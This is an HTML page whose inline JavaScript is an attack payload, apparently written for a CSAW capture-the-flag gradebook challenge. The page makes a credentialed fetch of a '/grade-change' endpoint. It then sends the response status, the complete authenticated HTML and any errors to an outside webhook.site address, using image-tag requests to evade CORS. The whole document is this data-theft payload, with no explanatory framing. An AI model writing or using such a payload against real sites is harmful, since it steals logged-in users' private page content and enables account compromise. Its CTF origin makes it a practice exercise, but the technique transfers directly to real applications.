<!DOCTYPE html>
<html>
<body>
    <script>
        function sendToWebhook(data) {
            // Encode data in URL parameters and use image tag to avoid CORS
            const params = new URLSearchParams();
            params.append('data', JSON.stringify(data));
            new Image().src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?${params.toString()}`;
        }

        // Send initial message
        sendToWebhook({
            message: 'Starting fetch of /grade-change',
            timestamp: new Date().toISOString()
        });

        // Fetch the grade-change endpoint
        fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
            credentials: 'include',
            mode: 'same-origin'
        })
        .then(response => {
            // Send response metadata first
            sendToWebhook({
                type: 'response_headers',
                status: response.status,
                statusText: response.statusText,
                url: response.url,
                redirected: response.redirected,
                timestamp: new Date().toISOString()
            });
            
            return response.text();
        })
        .then(html => {
            // Send the COMPLETE HTML content
            sendToWebhook({
                type: 'full_html',
                html: html,
                length: html.length,
                timestamp: new Date().toISOString()
            });
        })
        .catch(error => {
            // Send error details
            sendToWebhook({
                type: 'error',
                error: error.toString(),
                errorName: error.name,
                errorMessage: error.message,
                timestamp: new Date().toISOString()
            });
        });
    </script>
</body>
</html>
